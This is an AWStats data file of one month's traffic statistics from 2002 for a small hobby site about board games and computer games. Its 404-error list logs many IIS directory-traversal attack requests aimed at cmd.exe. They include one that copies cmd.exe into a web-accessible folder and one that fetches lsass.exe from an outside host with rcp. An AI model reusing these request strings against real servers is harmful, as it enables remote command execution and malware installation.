@@ -1,0 +1,646 @@
+AWSTATS DATA FILE 5.3 (build 1.431)
+# If you remove this file, all statistics for date 2002-09 will be lost/reset.
+
+# Position (offset in bytes) in this file of beginning of each section
+# for direct I/O access. If you made changes somewhere in this file, you
+# should also remove completely the MAP section (AWStats will rewrite it
+# at next update).
+BEGIN_MAP 23
+POS_GENERAL 1602                
+POS_TIME 1927                
+POS_VISITOR 2659                
+POS_DAY 8319                
+POS_DOMAIN 9212                
+POS_LOGIN 9595                
+POS_ROBOT 9729                
+POS_EMAILSENDER 10244               
+POS_EMAILRECEIVER 10387               
+POS_SESSION 10463               
+POS_SIDER 10670               
+POS_FILETYPES 12469               
+POS_BROWSER 12677               
+POS_OS 12926               
+POS_UNKNOWNREFERER 13077               
+POS_UNKNOWNREFERERBROWSER 13351               
+POS_ORIGIN 13598               
+POS_SEREFERRALS 13732               
+POS_PAGEREFS 13912               
+POS_SEARCHWORDS 14283               
+POS_KEYWORDS 15407               
+POS_ERRORS 16054               
+POS_SIDER_404 16189               
+END_MAP
+
+# LastLine    = Date of last record processed
+# FirstTime   = Date of first visit for history file
+# LastTime    = Date of last visit for history file
+# LastUpdate  = Date of last update - Nb of lines read - Nb of old records - Nb of new records - Nb of corrupted - Nb of dropped
+# TotalVisits = Number of visits
+# TotalUnique = Number of unique visitors
+# MonthHostsKnown   = Number of hosts known
+# MonthHostsUnKnown = Number of hosts unknown
+BEGIN_GENERAL 8
+LastLine 20021001000004
+FirstTime 20020901161017
+LastTime 20020930235403
+LastUpdate 20021227202445 40847 0 40365 65 417
+TotalVisits 101                 
+TotalUnique 75                  
+MonthHostsKnown 109                 
+MonthHostsUnknown 11                  
+END_GENERAL
+
+# Hour - Pages - Hits - Bandwidth
+BEGIN_TIME 24
+0 212 302 597621
+1 211 215 390027
+2 213 239 696865
+3 214 224 747043
+4 214 499 5669179
+5 216 261 863198
+6 213 283 1158222
+7 210 210 271999
+8 213 231 633203
+9 229 233 775862
+10 215 228 14183095
+11 211 219 406333
+12 251 385 1109645
+13 231 484 7757358
+14 232 616 5053427
+15 225 349 7040275
+16 226 331 1737022
+17 222 410 1729640
+18 225 374 508741
+19 226 246 678397
+20 222 231 500591
+21 223 237 639542
+22 250 289 483309
+23 225 327 882924
+END_TIME
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start of last visit date] - [Last page of last visit]
+# [Start of last visit date] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 120
+localhost 5148 5148 6732599 20020930235403
+rtp-webcache-2.cisco.com 37 97 16579435 20020930103625
+linksys 22 51 88475 20020910192730
+63.148.99.229 18 18 385834 20020921093735
+65.215.12.123 8 315 10245829 20020925214240
+biff.neo.rr.com 6 16 51034 20020909223242
+23.34.252.64.snet.net 4 289 5397180 20020922045359
+212.137.63.50 3 42 463020 20020924051222
+229.40.252.64.snet.net 3 141 0 20020922184318
+0x503e5745.abnxx4.adsl-dhcp.tele.dk 2 10 118023 20020904133437
+cache-rm05.proxy.aol.com 0 1 14096 
+pool-63.53.162.28.nwrk.grid.net 1 9 134341 20020907235149
+g119.brno.mistral.cz 1 1 139869 20020901161017
+cache-mtc-al03.proxy.aol.com 0 1 17558 
+cache-rp04.proxy.aol.com 0 1 17558 
+p166.n-sg1.stsn.com 1 1 0 20020908222159
+acb04fd2.ipt.aol.com 1 9 134341 20020930191925
+cache-mtc-ag05.proxy.aol.com 0 1 459 
+nwtfa-02p1-31.ppp11.odn.ad.jp 1 5 118023 20020916062431
+bi-01pt1.bluebird.ibm.com 1 9 134341 20020904150850
+cache-mtc-am03.proxy.aol.com 0 4 7235 
+cache-mtc-al09.proxy.aol.com 0 7 12017 
+cache-rl06.proxy.aol.com 0 1 18699 
+nocc.hq.navy.mil 0 4 48593 
+cse.ogi.edu 1 1 1954 20020927055653
+cache-mtc-ab02.proxy.aol.com 0 40 68217 
+eth0.cache1.jvl.ticon.net 1 9 134341 20020921232424
+63.147.8.169 1 9 134341 20020904130010
+cache-mtc-al04.proxy.aol.com 0 1 12879 
+catv096008.usr.hananet.net 0 1 221367 
+cache-mtc-ac02.proxy.aol.com 0 1 1630 
+vetnet2.vetorialnet.com.br 2 88 309295 20020912232818
+hera530-a197.otenet.gr 1 9 134341 20020909172726
+ce590-gdl01.terra.net.mx 0 2 34683 
+cache-mtc-am04.proxy.aol.com 0 1 2284 
+moa1050.ci.anchorage.ak.us 2 90 701586 20020927161159
+tide08.microsoft.com 1 1 155609 20020910030906
+nocb.hq.navy.mil 2 5 90531 20020920121823
+210-86-28-141.adsl.xtra.co.nz 1 9 134341 20020925182605
+ppp28.igu.forthnet.gr 2 12 226862 20020916083905
+cache-mtc-ac08.proxy.aol.com 0 1 1838 
+pd9e1c74d.dip.t-dialin.net 2 90 568936 20020919174032
+0-1pool46-202.nas18.portland1.or.us.da.qwest.net 1 5 118023 20020914190337
+cache-ntc-ag11.proxy.aol.com 0 1 18699 
+cache-loh-aa06.proxy.aol.com 0 1 4738 
+24-216-223-184.charter.com 1 5 118023 20020924010036
+adsl-65-64-74-107.dsl.okcyok.swbell.net 1 83 191272 20020904003758
+ops501.goo.ne.jp 1 1 1954 20020920101811
+woos-max2-cs-32.dialne.bright.net 1 5 118023 20020907205718
+alpha3.csd.uwm.edu 2 13 239485 20020926214358
+cp5300-3-13.cpinternet.com 1 4 87623 20020906180953
+cache-mtc-am05.proxy.aol.com 0 1 721 
+cw03.s1.srv.t-online.de 0 1 29945 
+200.245.82.129 1 5 118023 20020925162205
+ip133.100.susc.suscom.net 1 7 199449 20020907032427
+pd9e5e946.dip.t-dialin.net 1 87 491383 20020920143621
+noca.hq.navy.mil 0 4 61759 
+cache-ntc-ag12.proxy.aol.com 0 1 12623 
+p50838e1a.dip.t-dialin.net 2 68 768194 20020908064731
+cache-loh-aa07.proxy.aol.com 0 1 51481 
+adsl-67-39-5-255.dsl.dytnoh.ameritech.net 2 88 309295 20020928125110
+cache-mtc-ah02.proxy.aol.com 1 3 74481 20020905190138
+cache-mtc-ak01.proxy.aol.com 0 1 18699 
+62.37.236.16 1 9 134341 20020926080600
+pppoe0011.lr.centurytel.net 2 2 36338 20020919230335
+cache-loh-aa02.proxy.aol.com 0 1 29905 
+cw08.s1.srv.t-online.de 0 1 29905 
+cr001r01-test.sac2.fastsearch.net 1 1 0 20020926120228
+p3e9eb101.dip.t-dialin.net 2 8 126209 20020922051725
+cache-ntc-ah08.proxy.aol.com 0 2 25931 
+pd951ad0c.dip.t-dialin.net 1 6 118023 20020921145829
+clsm-216-37-153-245.ppp.clsm.epix.net 1 9 134341 20020928021151
+adsl-64-219-29-250.dsl.crchtx.swbell.net 1 9 134341 20020908022317
+cache-rp02.proxy.aol.com 0 1 23428 
+cw02.s1.srv.t-online.de 1 1 1954 20020920101530
+cache-mtc-ak07.proxy.aol.com 0 1 14096 
+ce590-gdl02.terra.net.mx 1 3 83340 20020909155211
+198.173.189.102 2 99 3017331 20020904134823
+host2.webwasher.com 2 2 3908 20020916192028
+cache-mtc-ab05.proxy.aol.com 0 1 2712 
+user-2ive27q.dialup.mindspring.com 1 88 571645 20020909171052
+cache-mtc-al07.proxy.aol.com 0 7 12785 
+cache-mtc-ah03.proxy.aol.com 0 1 4738 
+cache-rp08.proxy.aol.com 1 1 14631 20020926205259
+adsl-65-64-74-96.dsl.okcyok.swbell.net 1 17 77089 20020922131920
+cache-mtc-ak02.proxy.aol.com 0 4 17954 
+212.95.252.16 1 1 1954 20020930141414
+65.198.229.2 1 5 118023 20020927092106
+64.53.213.31 1 1 39869 20020918220954
+cpe0080c6e92ae2.cpe.net.cable.rogers.com 1 5 118023 20020914121332
+cache-mtc-ac05.proxy.aol.com 0 1 144 
+cw07.s1.srv.t-online.de 0 1 51481 
+32.9.35.65.cfl.rr.com 1 9 134341 20020918003655
+cache-loh-aa03.proxy.aol.com 0 1 29945 
+adsl-156-92-137.asm.bellsouth.net 1 9 134341 20020922130236
+c-24-127-4-153.we.client2.attbi.com 1 9 134341 20020908144153
+cache-ntc-ah09.proxy.aol.com 0 2 24933 
+cw01.s1.srv.t-online.de 0 1 4738 
+amontsouris-108-1-10-201.abo.wanadoo.fr 1 1 155609 20020904154020
+cache-ntc-ag04.proxy.aol.com 0 1 23428 
+cache-mtc-al02.proxy.aol.com 1 4 96055 20020902141554
+cache-rp03.proxy.aol.com 0 1 7375 
+proxy2.sbs.de 1 9 134341 20020918110328
+64.210.196.198 1 5 118023 20020909105719
+pec-92-161.tnt5.f.uunet.de 1 11 156184 20020922024351
+host213-122-247-46.in-addr.btopenworld.com 1 6 169504 20020924175626
+alb-24-169-30-104.nycap.rr.com 1 1 1954 20020930031740
+cache-ntc-ai09.proxy.aol.com 1 1 14631 20020908141110
+pool0886.cvx24-bradley.dialup.earthlink.net 1 9 134341 20020915160551
+cache-ntc-ah04.proxy.aol.com 0 1 14096 
+cache-mtc-am02.proxy.aol.com 1 1 1954 20020902141506
+www.whoisreport.com 1 1 1954 20020921133657
+cache-mtc-aa01.proxy.aol.com 0 6 10778 
+nocd.hq.navy.mil 0 1 51481 
+cache-loh-ac03.proxy.aol.com 1 1 1954 20020902140957
+cache-mtc-ak03.proxy.aol.com 0 1 210 
+dialup-209.246.107.213.dial1.newyork1.level3.net 2 94 1002866 20020926132452
+pm1-46.tcq.net 1 5 118023 20020906033020
+cache-mtc-ab01.proxy.aol.com 0 7 12711 
+cache-mtc-af05.proxy.aol.com 0 1 51481 
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 30
+20020901 1 1 139869 1
+20020902 3 93 427318 3
+20020903 1 24 2753700 1
+20020904 8 211 3750917 6
+20020905 1 9 134341 1
+20020906 2 10 427013 2
+20020907 3 21 451813 3
+20020908 6 96 1171217 5
+20020909 176 350 1397149 8
+20020910 242 242 511183 3
+20020911 240 240 354565 1
+20020912 242 328 663863 2
+20020913 240 240 354569 1
+20020914 239 247 522115 3
+20020915 241 249 259381 2
+20020916 245 259 473833 4
+20020917 240 240 125040 1
+20020918 243 259 542657 4
+20020919 245 333 14317241 4
+20020920 245 347 1218312 5
+20020921 268 585 11127278 6
+20020922 252 715 6245585 7
+20020923 240 240 354588 1
+20020924 245 293 1105140 4
+20020925 243 258 720231 4
+20020926 247 363 1827083 6
+20020927 244 336 1176168 4
+20020928 243 337 798216 3
+20020929 240 240 354586 1
+20020930 244 257 808547 5
+END_DAY
+
+# Domain - Pages - Hits - Bandwidth
+# The 10 first Pages must be first (order not required for others)
+BEGIN_DOMAIN 15
+ip 5208 5708 21597662
+com 64 380 19187863
+net 34 1051 10667716
+de 3 25 408548
+gr 3 21 361203
+edu 3 14 241439
+dk 2 10 118023
+jp 2 6 119977
+us 2 90 701586
+mil 2 14 252364
+fr 1 1 155609
+cz 1 1 139869
+mx 1 5 118023
+br 2 88 309295
+nz 1 9 134341
+END_DOMAIN
+
+# Login - Pages - Hits - Bandwidth - Last visit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_LOGIN 0
+END_LOGIN
+
+# Robot ID - Hits - Bandwidth - Last visit
+# The 10 first Hits must be first (order not required for others)
+BEGIN_ROBOT 12
+jeeves 112 1816040 20020924134548
+ia_archiver 87 9461817 20020926161236
+slurp 63 672380 20020929131220
+wisenutbot 56 849341 20020917073035
+python 27 480739 20020910181228
+openfind 7 107356 20020926050852
+googlebot 3 33033 20020902183517
+gigabot 2 189693 20020904165104
+mercator 2 3908 20020914124905
+scooter 2 3908 20020923044721
+voila 1 0 20020913174325
+netcraft 1 0 20020913124323
+END_ROBOT
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first Hits must be first (order not required for others)
+BEGIN_EMAILSENDER 0
+END_EMAILSENDER
+
+# EMail - Hits - Bandwidth - Last visit
+# The 20 first hits must be first (order not required for others)
+BEGIN_EMAILRECEIVER 0
+END_EMAILRECEIVER
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+15mn-30mn 2
+0s-30s 65
+1h+ 23
+5mn-15mn 2
+30s-2mn 4
+2mn-5mn 3
+30mn-1h 2
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 46
+/blacknova/scheduler.php 5148 6732599 22 22
+/ 46 82068 41 29
+/boardgames/ 25 351144 21 23
+/beholder/clue_book/index.shtml 24 835200 6 13
+/blacknova/main.php 11 36670 0 1
+/blacknova/login2.php 10 10458 0 0
+/blacknova/login.php 7 12709 0 1
+/evil.pdf 4 13433599 3 3
+/game_design/impulser.txt 4 606696 3 3
+/info.php 3 57138 0 0
+/game_design/ships_logs/ship_log.22.html 1 14345 0 0
+/game_design/ships_logs/ship_log.2.html 1 4724 0 0
+/blacknova/lrscan.php 1 1286 0 0
+/game_design/ships_logs/ship_log.21.html 1 14345 0 0
+/game_design/ships_logs/ship_log.6.html 1 5106 0 0
+/game_design/ships_logs/ship_log.1.html 1 12131 0 0
+/blacknova/move.php 2 1106 0 0
+/game_design/ships_logs/ship_log.19.html 1 15833 0 0
+/blacknova/ranking.php 1 1343 0 0
+/blacknova/rsmove.php 2 2083 0 0
+/blacknova/port.php 1 4034 0 0
+/blacknova/mailto2.php 1 1222 0 0
+/blacknova/report.php 1 1553 0 0
+/blacknova/mail.php 2 1922 0 0
+/blacknova/teams.php 2 2304 0 0
+/game_design/ships_logs/ship_log.20.html 1 14345 0 0
+/game_design/ships_logs/ship_log.5.html 1 20812 0 0
+/blacknova/index.php 1 1754 0 0
+/blacknova/readmail.php 1 997 0 0
+/blacknova/ 3 5259 1 0
+/magna/ 1 1159 1 1
+/blacknova/create_universe.php 1 1070 1 0
+/game_design/ 2 3980 0 1
+/game_design/ships_logs/ship_log.4.html 1 4592 0 0
+/blacknova/feedback.php 1 1188 0 1
+/game_design/add_test_ship2.html 1 1432 0 1
+/baycrafters/ 1 6373 1 1
+/game_design/ships_logs/ship_log.23.html 1 4607 0 0
+/game_design/ships_logs/ship_log.3.html 1 13094 0 0
+/game_design/ship_status.html 1 34084 0 0
+/blacknova/traderoute.php 2 2678 0 0
+/blacknova/navcomp.php 3 3222 0 0
+/blacknova/logout.php 2 2019 1 1
+/sql/left.php 1 966 0 0
+/sql/main.php 1 3117 0 0
+/sql/ 1 906 0 0
+END_SIDER
+
+# Files type - Hits - Bandwidth - Bandwidth without compression - Bandwidth after compression
+BEGIN_FILETYPES 8
+php 5205 6883438 0 0
+shtml 24 835200 0 0
+txt 4 606696 0 0
+png 96 25303 0 0
+gif 180 2248462 0 0
+pdf 4 13433599 0 0
+jpg 1818 29870481 0 0
+html 92 610339 0 0
+END_FILETYPES
+
+# Browser ID - Hits
+BEGIN_BROWSER 16
+netscape4.61 94
+netscape5.0 169
+netscape4.5 1
+netscape4.7 8
+netscape7.0 9
+msie5.0 192
+msie6.0 679
+opera 11
+msie5.5 343
+Unknown 5
+msie4.01 88
+libwww 1
+netscape4.08 99
+lynx 5148
+msie5.01 571
+netscape4.51 5
+END_BROWSER
+
+# OS ID - Hits
+BEGIN_OS 9
+winme 209
+winxp 75
+winnt 108
+win95 105
+win2000 929
+Unknown 5153
+win98 746
+freebsd 1
+linux 97
+END_OS
+
+# Unknown referer OS - Last visit date
+BEGIN_UNKNOWNREFERER 4
+DoCoMo/1.0/N504i/c10/TB 20020920101811
+Lynx/2.8.4rel.1_libwww-FM/2.14_SSL-MM/1.4.1_OpenSSL/0.9.6c 20020930235403
+Mozilla/3.01_(compatible;) 20020907032427
+libwww-perl/5.51 20020910030906
+END_UNKNOWNREFERER
+
+# Unknown referer Browser - Last visit date
+BEGIN_UNKNOWNREFERERBROWSER 3
+DoCoMo/1.0/N504i/c10/TB 20020920101811
+curl/7.9.8_(i386-unknown-freebsd4.6.2)_libcurl_7.9.8_(OpenSSL_0.9.6) 20020926120228
+Mozilla/3.01_(compatible;) 20020907032427
+END_UNKNOWNREFERERBROWSER
+
+# Origin - Pages - Hits 
+BEGIN_ORIGIN 6
+From0 5202 5256
+From1 2 2
+From2 51 56
+From3 6 6
+From4 68 2103
+From5 0 0
+END_ORIGIN
+
+# Search engine referers ID - Hits
+BEGIN_SEREFERRALS 8
+msn. 3
+google. 32
+images.google. 11
+yahoo. 1
+search.aol.co 2
+search.dogpile.com 4
+netscape. 1
+www.search.com 2
+END_SEREFERRALS
+
+# External page referers - Hits
+BEGIN_PAGEREFS 5
+http://141.211.203.26/~zzheng/qa-new/answer.cgi 1
+http://turbo10.com/cgi-bin/searchbox1.cgi 1
+http://search.earthlink.net/search 2
+http://planets.unix-ag.uni-hannover.de/planets/playerInfo.do 1
+http://www.whoisreport.com 1
+END_PAGEREFS
+
+# Search keyphrases - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_SEARCHWORDS 35
+eye+of+the+beholder+computer+game 4
+eye+of+the+beholder 3
+eye+of+the+beholder+d%26d 2
+eye+of+the+beholder+ssi 2
+eye+of+the+beholder+clue+book 2
+ssi+eye+of+the+beholder 1
+klingons+and+dungeons+and+dragons 1
+star+fleet+battles+minatures 1
+eob+game 1
+yaquinto+ironclads 1
+eye+of+the+beholder+1 1
+eob+eye 1
+eye+beholder+walkthrough 1
+avalon+hill+tobruk 1
+minatures+gamestore 1
+ssi+eye+of+the+beholder+windows+2000+sound+fix 1
+battletech+battledroids 1
+avalon+hill+civilization+rulebook 1
+battletech+original+rule+book 1
+eye+of+beholder+computer+game 1
+crack+submarines+game 1
+eye+of+the+beholder+game 1
+dungeons+and+dragons+basic+box+rules+copy 1
+starfleet+battles+minatures+for+sale 1
+games+to+determine+someones+age 1
+avalon+hill+airforce 1
+eye+beholder+game 1
+kzinti+ship+designs 1
+eye+of+the+beholder+dungeons 1
+eta+http%2dequiv%3d+refresh+target 1
+sql+semaphor 1
+eye+of+the+beholder+westwood 1
+starfleet+battles+basic+set 1
+wargame+minatures 1
+eye+of+the+beholder+jpg 1
+END_SEARCHWORDS
+
+# Search keywords - Number of search
+# The 10 first number of search must be first (order not required for others)
+BEGIN_KEYWORDS 65
+eye 24
+beholder 23
+of 21
+the 20
+game 9
+computer 5
+ssi 4
+minatures 4
+hill 3
+and 3
+rules 1
+http%2dequiv%3d 1
+basic 2
+clue 2
+battledroids 1
+starfleet 2
+walkthrough 1
+battletech 2
+games 1
+crack 1
+age 1
+copy 1
+someones 1
+box 1
+airforce 1
+fleet 1
+book 3
+for 1
+1 1
+ship 1
+civilization 1
+refresh 1
+ironclads 1
+eob 2
+d%26d 2
+klingons 1
+avalon 3
+dragons 2
+original 1
+star 1
+tobruk 1
+sound 1
+jpg 1
+semaphor 1
+rule 1
+wargame 1
+kzinti 1
+designs 1
+sale 1
+rulebook 1
+to 1
+battles 3
+eta 1
+set 1
+gamestore 1
+fix 1
+target 1
+2000 1
+sql 1
+submarines 1
+windows 1
+dungeons 3
+westwood 1
+determine 1
+yaquinto 1
+END_KEYWORDS
+
+# Errors - Hits - Bandwidth
+BEGIN_ERRORS 4
+206 62 32449616
+400 773 223224
+404 5266 1590782
+301 20 6263
+END_ERRORS
+
+# URL with 404 errors - Hits - Last URL referer
+BEGIN_SIDER_404 80
+/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir 369 -
+/cgi-bin/game_design/reset_ships.pl 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d1 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d2 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d3 1 -
+/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir 368 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d5 1 -
+/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+c:\\winnt\\system32\\cmd.exe+c:\\inetpub\\scripts\\script.exe 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d7 1 -
+/scripts/..%255c../winnt/system32/cmd.exe?/c+dir 371 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d8 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d9 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=20 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=21 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=22 1 -
+/combat_sim.html 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=23 1 -
+/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir 369 -
+/d/winnt/system32/cmd.exe?/c+dir 373 -
+/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+lsass.exe 1 -
+/scripts/..%252f../winnt/system32/cmd.exe?/c+dir 368 -
+/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir 368 -
+/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir 369 -
+/MSADC/root.exe?/c+dir 373 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d19 1 -
+/old/game_design/ship_status.html 2 -
+/cgi-bin/game_design/copy_impulser.pl 2 -
+/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+rcp+-b+64.21.95.7.lp:lsass.exe+. 1 -
+/game_design/console.txt 9 -
+/game_design/bigconsole.txt 9 -
+/cgi-bin/bbs.pl 2 -
+/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\ 1 -
+/cgi-bin/game_design/modify_tf.pl?tf%3d1 1 -
+/cgi-bin/game_design/modify_tf.pl?tf%3d2 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=1 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=2 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=19 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=3 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d21 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=4 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d22 1 -
+/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir 368 -
+/cgi-bin/game_design/modify_convoy.pl?convoy=1 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=5 1 -
+/console.txt 1 -
+/cgi-bin/game_design/modify_ship.pl?ship=6 1 -
+/cgi-bin/game_design/start_impulser.pl 2 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d10 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d12 1 -
+/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir 368 -
+http://help.yahoo.com/help/us/ysearch/ysearch-08.html 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d14 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=1 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=2 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d16 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=3 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d17 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=4 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=5 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d19 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=6 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=20 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=21 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d1 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=22 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship=23 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d4 1 -
+/cgi-bin/game_design/show_waypoints.pl?ship%3d5 1 -
+/c/winnt/system32/cmd.exe?/c+dir 373 -
+/cgi-bin/game_design/modify_tf.pl?tf=0 1 -
+/cgi-bin/game_design/modify_tf.pl?tf=1 1 -
+/cgi-bin/game_design/modify_tf.pl?tf=2 1 -
+/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir+c:\\ 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d20 1 -
+/cgi-bin/game_design/modify_ship.pl?ship%3d22 1 -
+/cgi-bin/game_design/stop_impulser.pl 1 -
+/task_force.html 1 -
+/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir 368 -
+/scripts/root.exe?/c+dir 375 -
+/cgi-bin/game_design/modify_ship.pl?ship=19 1 -
+END_SIDER_404
